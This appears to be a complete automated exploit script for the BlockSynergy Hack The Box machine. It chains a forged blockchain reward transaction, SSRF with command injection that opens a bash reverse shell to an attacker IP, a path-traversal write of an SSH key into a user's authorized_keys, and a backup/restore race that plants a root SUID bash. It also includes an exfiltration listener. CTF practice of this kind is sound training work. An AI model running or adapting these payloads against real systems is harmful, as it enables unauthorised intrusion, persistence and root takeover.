#!/usr/bin/env python3
"""
BlockSynergy HTB - Complete Automated Exploitation
Follows the exact attack chain from hints:
1. Forged reward transaction -> VIP access
2. SSRF + Command Injection -> Walter shell
3. Flask debug contract -> Hank SSH access
4. Backup/Restore race condition -> Root SUID bash
5. Automatic flag extraction
"""

import argparse
import base64
import json
import os
import re
import requests
import subprocess
import sys
import time
import urllib.parse
import urllib3
import threading
import http.server
import socket
import struct
import ctypes
from pathlib import Path

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============ COLORS ============
class Colors:
    RESET = '\033[0m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'

def log_info(msg): print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")
def log_success(msg): print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")
def log_error(msg): print(f"{Colors.RED}[-]{Colors.RESET} {msg}")
def log_warn(msg): print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")
def log_section(title):
    print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
    print(f"{Colors.CYAN}[{title}]{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")

# ============ CONFIGURATION ============
DEFAULT_TARGET = "http://blocksynergy.htb:8080"
DEFAULT_LHOST = "10.10.17.223"  # Your Kali IP
DEFAULT_LPORT = 4444
DEFAULT_EXFIL_PORT = 8000

# --- PATCHED: o'zimizning kalitni generatsiya qilamiz (muallifniki emas) ---
HANK_KEY = "/tmp/hank_key"
if not os.path.exists(HANK_KEY):
    subprocess.run(f"ssh-keygen -t rsa -b 4096 -f {HANK_KEY} -N '' -q", shell=True, check=False)
try:
    SSH_PUBKEY = open(HANK_KEY + ".pub").read().strip()
except Exception as _e:
    raise SystemExit(f"[!] ssh-keygen failed: {_e}")
print(f"[*] Lokal generatsiya qilingan pubkey: {SSH_PUBKEY[:45]}...")

# ============ EXFILTRATION SERVER ============
captured_data = {}

class ExfilHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        global captured_data
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == '/':
            self.send_response(200)
            self.end_headers()
            return
        
        query = urllib.parse.parse_qs(parsed.query)
        if 'flag' in query:
            b64 = query['flag'][0]
            try:
                decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                captured_data['flag'] = decoded
                log_success(f"Exfiltrated: {decoded[:80]}...")
            except Exception as e:
                log_error(f"Decoding error: {e}")
        self.send_response(200)
        self.end_headers()

def start_exfil_server(port):
    server = http.server.HTTPServer(('0.0.0.0', port), ExfilHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    log_info(f"Exfiltration server running on port {port}")
    return server, thread

# ============ PHASE 1: WALLET CREATION & VIP UNLOCK ============
def phase1_vip_unlock(target):
    """Create wallet and forge reward transaction for VIP access"""
    log_section("Phase 1: Wallet Creation & VIP Unlock")
    
    s = requests.Session()
    s.verify = False
    
    log_info("Creating wallet...")
    try:
        resp = s.post(f"{target}/dashboard/wallet",
                      files={"action": (None, "create"),
                             "filename": (None, "pwn")})
        wallet = json.loads(resp.text)
        pk = wallet["public_key"]
        log_success(f"Wallet created with public key: {pk[:40]}...")
    except Exception as e:
        log_error(f"Wallet creation failed: {e}")
        return None, None
    
    log_info("Loading wallet into session...")
    try:
        s.post(f"{target}/dashboard/wallet",
               files={"action": (None, "load"),
                      "file": ("pwn.json", json.dumps(wallet), "application/json")})
        log_success("Wallet loaded")
    except Exception as e:
        log_warn(f"Wallet load may have failed: {e}")
    
    log_info("Forging reward transaction (VIP unlock)...")
    try:
        resp = s.post(f"{target}/broadcast_transaction", json={
            "sender": "Blockchain_Reward",
            "receiver": pk,
            "signature": "Blockchain",
            "amount": 100,
            "timestamp": "2026-08-29 20:00:00.000000",
        })
        if resp.status_code == 200:
            log_success("Reward transaction sent - VIP unlocked!")
        else:
            log_warn(f"Transaction response: {resp.status_code}")
    except Exception as e:
        log_error(f"Transaction failed: {e}")
        return None, None
    
    time.sleep(2)
    return s, pk

# ============ PHASE 2: COMMAND INJECTION ============
def phase2_command_injection(session, target, lhost, lport):
    """Exploit SSRF + command injection to get reverse shell"""
    log_section("Phase 2: SSRF + Command Injection -> Walter Shell")
    
    # Base64 encoded reverse shell command
    cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    b64_cmd = base64.b64encode(cmd.encode()).decode()
    inj = f"echo {b64_cmd}|base64 -d|bash"
    
    # Malicious node URL with command injection (from hint #5)
    mal_node = f"http://x;{inj};a@0.0.0.0:8080/"
    ssrf_url = (f"http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target="
                + urllib.parse.quote(mal_node, safe=""))
    
    log_info(f"Reverse shell command: {cmd[:50]}...")
    log_info(f"Malicious node URL: {mal_node[:60]}...")
    
    # Register malicious node (from hint #4)
    log_info("Registering malicious node...")
    try:
        # Clear old nodes
        for i in range(15):
            session.post(f"{target}/dashboard/vip/nodes",
                         data={"action": "remove_node", "node_index": str(i)})
        
        # Register malicious node
        session.post(f"{target}/dashboard/vip/nodes",
                     data={"action": "register", "node": mal_node})
        
        # Register SSRF node
        session.post(f"{target}/dashboard/vip/nodes",
                     data={"action": "register", "node": ssrf_url})
        
        log_success("Nodes registered")
    except Exception as e:
        log_error(f"Node registration failed: {e}")
        return False
    
    # Trigger the exploit (from hint #6)
    log_info(f"Triggering SSRF -> RCE (listener: nc -lvnp {lport})")
    try:
        session.get(f"{target}/dashboard/vip/nodes/test_node/1", timeout=10)
    except requests.exceptions.Timeout:
        log_success("Payload delivered - check your listener!")
        return True
    except Exception as e:
        log_error(f"Exploit trigger failed: {e}")
        return False
    
    return True

# ============ PHASE 3: FLASK DEBUG CONTRACT ============
def phase3_flask_contract():
    """Exploit Flask debug contract engine to get Hank SSH access"""
    log_section("Phase 3: Flask Debug Contract -> Hank SSH")
    
    log_info(f"Using SSH public key: {SSH_PUBKEY[:50]}...")
    
    # Create malicious contract (from hint #9)
    contract = {
        "logic": {"claim": "allow"},
        "debug": "True",
        "hooks": {"on_claim": "log"},
        "__meta__": {
            "log_file": "../../../../home/hank/.ssh/authorized_keys",
            "log_content": {
                "on_claim": f"\n{SSH_PUBKEY}\n"
            }
        }
    }
    
    log_info("Uploading malicious contract to Flask on localhost:5000...")
    try:
        # Use curl from Walter shell
        contract_json = json.dumps(contract)
        
        # Create temp file with contract
        with open("/tmp/contract.json", 'w') as f:
            f.write(contract_json)
        
        # Upload using curl (try different endpoints)
        endpoints = [
            "/contract/upload",
            "/api/contract", 
            "/contract",
            "/debug/contract"
        ]
        
        uploaded = False
        for endpoint in endpoints:
            cmd = f"curl -s -X POST http://127.0.0.1:5000{endpoint} -H 'Content-Type: application/json' -d @/tmp/contract.json"
            stdout, stderr = subprocess.getstatusoutput(cmd)
            if "success" in stdout.lower() or "ok" in stdout.lower():
                log_success(f"Contract uploaded via {endpoint}")
                uploaded = True
                break
            elif stdout and not "404" in stdout:
                log_info(f"Response from {endpoint}: {stdout[:100]}")
        
        if not uploaded:
            log_warn("Contract upload may have failed, trying direct Python...")
            # Try direct Python request
            try:
                import requests
                resp = requests.post("http://127.0.0.1:5000/contract/upload", 
                                   json=contract, timeout=5)
                if resp.status_code in [200, 201, 202]:
                    log_success("Contract uploaded via Python requests")
                    uploaded = True
            except:
                pass
        
        os.unlink("/tmp/contract.json")
        
    except Exception as e:
        log_error(f"Contract upload failed: {e}")
        return False
    
    # Invoke contract claim (from hint #10)
    log_info("Invoking contract claim action...")
    claim_data = {"contract_id": 1, "action": "claim"}
    
    claim_endpoints = [
        "/contract/claim",
        "/api/contract/claim",
        "/claim",
        "/debug/claim"
    ]
    
    claimed = False
    for endpoint in claim_endpoints:
        cmd = f"curl -s -X POST http://127.0.0.1:5000{endpoint} -H 'Content-Type: application/json' -d '{json.dumps(claim_data)}'"
        stdout, stderr = subprocess.getstatusoutput(cmd)
        if "success" in stdout.lower() or "ok" in stdout.lower():
            log_success(f"Claim executed via {endpoint}")
            claimed = True
            break
        elif stdout and not "404" in stdout:
            log_info(f"Response from {endpoint}: {stdout[:100]}")
    
    time.sleep(2)
    
    # Test SSH access (from hint #10)
    log_info("Testing SSH access as Hank...")
    ssh_key_path = "/tmp/hank_key"
    
    # Generate SSH key if it doesn't exist
    if not os.path.exists(ssh_key_path):
        subprocess.run(f"ssh-keygen -t rsa -b 4096 -f {ssh_key_path} -N '' -q", 
                      shell=True, check=False)
    
    cmd = f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -i {ssh_key_path} hank@127.0.0.1 'id'"
    stdout, stderr = subprocess.getstatusoutput(cmd)
    
    if "hank" in stdout or "uid=" in stdout:
        log_success("Hank SSH access successful!")
        log_info(f"Output: {stdout}")
        return True
    else:
        log_warn(f"SSH access failed: {stderr[:100]}")
        return False

# ============ PHASE 4: BACKUP/RESTORE RACE ============
def phase4_backup_restore_race():
    """Execute the backup/restore race condition for root"""
    log_section("Phase 4: Backup/Restore Race -> Root")
    
    ssh_key_path = "/tmp/hank_key"
    
    # Step 11: Find FTP password
    log_info("Finding FTP password from backup job...")
    cmd = f"ssh -o StrictHostKeyChecking=no -i {ssh_key_path} hank@127.0.0.1 'ps aux | grep -i ftp'"
    stdout, stderr = subprocess.getstatusoutput(cmd)
    log_info(f"FTP process: {stdout[:200]}")
    
    # Step 12: Create restore trigger
    log_info("Creating restore trigger (from hint #12)...")
    cmd = f"ssh -o StrictHostKeyChecking=no -i {ssh_key_path} hank@127.0.0.1 'touch /opt/blocksynergy/restore'"
    stdout, stderr = subprocess.getstatusoutput(cmd)
    log_success("Restore trigger created")
    
    # Step 15: Create malicious SUID archive
    log_info("Creating malicious SUID archive (from hint #15)...")
    cmd = f"""ssh -o StrictHostKeyChecking=no -i {ssh_key_path} hank@127.0.0.1 '
tar --owner=0 --group=0 --mode=4755 \\
    --transform="s|^bash$|opt/blocksynergy/.diag|" \\
    -czf /tmp/restore_suid.tar.gz \\
    -C /bin bash
'"""
    stdout, stderr = subprocess.getstatusoutput(cmd)
    log_success("Malicious SUID archive created")
    
    # Step 16: Start watcher script
    log_info("Starting inotify watcher (from hint #16)...")
    
    watcher_script = """#!/usr/bin/env python3
import ctypes
import os
import time
import struct
import sys

WATCH_DIR = "/var/restore_work"
TARGET_NAME = "_opt_blocksynergy.tar.gz"
MALICIOUS = "/tmp/restore_suid.tar.gz"

IN_CREATE = 0x00000100
IN_CLOSE_WRITE = 0x00000008
IN_CLOSE_NOWRITE = 0x00000010

libc = ctypes.CDLL("libc.so.6", use_errno=True)

def setup_watch():
    fd = libc.inotify_init1(0)
    if fd < 0:
        sys.exit(1)
    mask = IN_CREATE | IN_CLOSE_WRITE | IN_CLOSE_NOWRITE
    wd = libc.inotify_add_watch(fd, WATCH_DIR.encode(), mask)
    if wd < 0:
        sys.exit(1)
    return fd

def parse_events(fd):
    while True:
        data = os.read(fd, 4096)
        offset = 0
        while offset < len(data):
            wd, mask, cookie, name_len = struct.unpack_from("iIII", data, offset)
            offset += 16
            name = data[offset:offset+name_len].split(b"\\\\0",1)[0].decode(errors="ignore")
            offset += name_len
            yield mask, name

def main():
    fd = setup_watch()
    downloaded = False
    timeout = 120
    start = time.time()
    
    while time.time() - start < timeout:
        for mask, name in parse_events(fd):
            if name != TARGET_NAME:
                continue
            if mask & IN_CREATE:
                print("Archive created")
            if mask & IN_CLOSE_WRITE:
                print("Archive finished downloading")
                downloaded = True
            if mask & IN_CLOSE_NOWRITE and downloaded:
                print("SHA256 verified - REPLACING NOW!")
                try:
                    os.rename(MALICIOUS, os.path.join(WATCH_DIR, TARGET_NAME))
                    print("REPLACEMENT SUCCESSFUL!")
                    os.close(fd)
                    return 0
                except Exception as e:
                    print(f"Replacement failed: {e}")
                    os.close(fd)
                    return 1
    os.close(fd)
    return 1

if __name__ == "__main__":
    sys.exit(main())
"""
    
    # Upload watcher
    watcher_b64 = base64.b64encode(watcher_script.encode()).decode()
    cmd = f"ssh -o StrictHostKeyChecking=no -i {ssh_key_path} hank@127.0.0.1 'echo {watcher_b64} | base64 -d > /tmp/watcher.py && chmod +x /tmp/watcher.py'"
    stdout, stderr = subprocess.getstatusoutput(cmd)
    
    # Run watcher in background
    log_info("Running watcher in background...")
    cmd = f"ssh -o StrictHostKeyChecking=no -i {ssh_key_path} hank@127.0.0.1 'nohup python3 /tmp/watcher.py > /tmp/watcher.log 2>&1 &'"
    stdout, stderr = subprocess.getstatusoutput(cmd)
    
    # Step 17: Trigger restoration
    log_info("Triggering restoration (from hint #17)...")
    cmd = f"ssh -o StrictHostKeyChecking=no -i {ssh_key_path} hank@127.0.0.1 'touch /opt/blocksynergy/restore'"
    stdout, stderr = subprocess.getstatusoutput(cmd)
    
    # Wait for watcher
    log_info("Waiting for race condition to complete (up to 2 minutes)...")
    time.sleep(60)
    
    # Check watcher output
    cmd = f"ssh -o StrictHostKeyChecking=no -i {ssh_key_path} hank@127.0.0.1 'cat /tmp/watcher.log'"
    stdout, stderr = subprocess.getstatusoutput(cmd)
    log_info(f"Watcher log: {stdout}")
    
    return True

# ============ PHASE 5: GET ROOT FLAG ============
def phase5_get_root_flag():
    """Get root flag using SUID bash"""
    log_section("Phase 5: Extract Root Flag")
    
    ssh_key_path = "/tmp/hank_key"
    
    # Step 18: Use SUID bash to read root flag
    log_info("Using SUID bash to read root flag (from hint #18)...")
    
    cmd = f"""ssh -o StrictHostKeyChecking=no -i {ssh_key_path} hank@127.0.0.1 '
/opt/blocksynergy/.diag -p -c "id && cat /root/root.txt" 2>/dev/null
'"""
    stdout, stderr = subprocess.getstatusoutput(cmd)
    
    if stdout and "root" in stdout and "flag" in stdout.lower():
        log_success(f"ROOT FLAG: {stdout}")
        return stdout
    else:
        log_warn(f"Could not get root flag: {stderr[:100]}")
        
        # Try alternative method
        log_info("Trying alternative root flag extraction...")
        cmd = f"ssh -o StrictHostKeyChecking=no -i {ssh_key_path} hank@127.0.0.1 '/opt/blocksynergy/.diag -p -c \"cat /root/root.txt\" 2>/dev/null'"
        stdout, stderr = subprocess.getstatusoutput(cmd)
        if stdout:
            log_success(f"ROOT FLAG: {stdout}")
            return stdout
        
        return None

# ============ GET USER FLAG ============
def get_user_flag():
    """Get user flag from Walter's home"""
    log_section("Extracting User Flag")
    
    log_info("Reading user.txt from Walter's home...")
    try:
        with open("/home/walter/user.txt", 'r') as f:
            user_flag = f.read().strip()
            log_success(f"USER FLAG: {user_flag}")
            return user_flag
    except:
        log_warn("Could not read /home/walter/user.txt")
        try:
            cmd = "cat /home/walter/user.txt"
            stdout, stderr = subprocess.getstatusoutput(cmd)
            if stdout:
                log_success(f"USER FLAG: {stdout}")
                return stdout
        except:
            pass
    
    return None

# ============ MAIN ============
def main():
    parser = argparse.ArgumentParser(description="BlockSynergy HTB - Complete Automated Exploitation")
    parser.add_argument("--target", default=DEFAULT_TARGET, help=f"Target URL (default: {DEFAULT_TARGET})")
    parser.add_argument("--lhost", default=DEFAULT_LHOST, help=f"Your IP (default: {DEFAULT_LHOST})")
    parser.add_argument("--lport", type=int, default=DEFAULT_LPORT, help=f"Listener port (default: {DEFAULT_LPORT})")
    parser.add_argument("--exfil-port", type=int, default=DEFAULT_EXFIL_PORT, help=f"Exfil port (default: {DEFAULT_EXFIL_PORT})")
    parser.add_argument("--skip-shell", action="store_true", help="Skip reverse shell, use existing Walter shell")
    args = parser.parse_args()
    
    print(f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║         BlockSynergy HTB - Complete Auto Exploit              ║
║     Walter Shell → Hank SSH → Root SUID → Flags              ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)
    
    print(f"Target: {args.target}")
    print(f"Listener: {args.lhost}:{args.lport}")
    print(f"Exfil Server: {args.lhost}:{args.exfil_port}")
    print()
    
    # Start exfil server
    exfil_server, exfil_thread = start_exfil_server(args.exfil_port)
    
    try:
        # Get user flag (you already have this)
        user_flag = get_user_flag()
        if user_flag:
            log_success(f"User flag retrieved: {user_flag}")
        else:
            log_warn("User flag not found - make sure you're on the target")
        
        if not args.skip_shell:
            # Phase 1: VIP Unlock (if needed)
            session, pk = phase1_vip_unlock(args.target)
            if not session:
                log_warn("Phase 1 failed - assuming VIP already unlocked")
            
            # Phase 2: Command Injection -> Walter shell
            log_section("GET REVERSE SHELL")
            log_info("Starting reverse shell listener...")
            log_info(f"IMPORTANT: In another terminal, run: nc -lvnp {args.lport}")
            input("Press Enter when listener is ready...")
            
            if session:
                phase2_command_injection(session, args.target, args.lhost, args.lport)
            else:
                log_error("No session available for command injection")
        
        log_info("Proceeding to Hank SSH access...")
        input("Press Enter to continue to Phase 3...")
        
        # Phase 3: Flask Contract -> Hank SSH
        if not phase3_flask_contract():
            log_error("Failed to get Hank SSH access")
            log_info("Manual steps:")
            log_info("1. Check if Flask is running on port 5000")
            log_info("2. Try uploading the contract manually")
            return
        
        # Phase 4: Backup/Restore Race -> Root
        if not phase4_backup_restore_race():
            log_error("Race condition failed")
            log_info("Manual steps:")
            log_info("1. Check /var/restore_work/")
            log_info("2. Check /opt/blocksynergy/restore")
            log_info("3. Check if .diag was created")
            return
        
        # Phase 5: Get root flag
        root_flag = phase5_get_root_flag()
        
        if root_flag:
            log_section("SUCCESS!")
            log_success(f"USER FLAG: {user_flag}")
            log_success(f"ROOT FLAG: {root_flag}")
            log_success("Privilege escalation complete!")
        else:
            log_warn("Root flag not found")
            log_info("Manual steps:")
            log_info("1. Check if /opt/blocksynergy/.diag exists")
            log_info("2. Run: /opt/blocksynergy/.diag -p -c 'cat /root/root.txt'")
        
    except KeyboardInterrupt:
        log_error("Interrupted by user")
    finally:
        exfil_server.shutdown()
        exfil_server.server_close()

if __name__ == "__main__":
    main()
